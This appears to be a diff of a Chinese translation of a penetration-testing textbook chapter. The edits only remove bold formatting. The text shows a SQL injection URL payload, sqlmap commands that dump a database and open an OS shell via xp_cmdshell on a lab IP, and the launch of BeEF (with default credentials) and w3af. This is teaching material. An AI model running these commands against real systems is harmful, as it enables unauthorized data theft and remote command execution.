@@ -125,7 +125,7 @@ http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0)
 示例 14-1. 使用 SQLMap 转储数据库
 
 ```
-root@kali:~# **sqlmap -u**❶ **"http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --dump**❷
+root@kali:~# sqlmap -u❶ **"http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --dump**❷
 --*snip*--
 [21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase stacked queries' injectable
 --*snip*--
@@ -155,7 +155,7 @@ that then produces topnotch sites. |
 示例 14-2. 通过 SQL 注入访问`xp_cmdshell`
 
 ```
-root@kali:~# **sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --os-shell**
+root@kali:~# sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --os-shell
 --*snip*--
 xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] **Y**
 --*snip*--
@@ -317,8 +317,8 @@ XSS 问题往往被忽视。一个仅显示“XSS”的警告框能造成多大�
 示例 14-3. 启动 BeEF
 
 ```
-root@kali:~# **cd /usr/share/beef-xss/**
-root@kali:/usr/share/beef-xss# **./beef**
+root@kali:~# cd /usr/share/beef-xss/
+root@kali:/usr/share/beef-xss# ./beef
 [11:53:26][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
 [11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha
 --*snip*--
@@ -371,7 +371,7 @@ BeEF 的默认凭据是*beef:beef*。在登录对话框中输入这些凭据后�
 现在启动 w3af，如下所示。
 
 ```
-root@kali:~# **w3af**
+root@kali:~# w3af
 ```
 
 w3af 的 GUI 将会启动，并且看起来类似于图 14-29。屏幕左侧是扫描配置文件。默认情况下，你处于一个空配置文件中，这允许你完全自定义针对目标运行哪些 w3af 插件。你还可以使用几个预配置的配置文件。例如，*OWASP_Top10*配置文件将使用发现部分的插件爬取应用，并运行来自审计部分的插件，查找来自开放 Web 应用安全项目（OWASP）十大漏洞类别的漏洞。输入要扫描的 URL，如图 14-29 所示，然后点击窗口右侧的**开始**按钮。
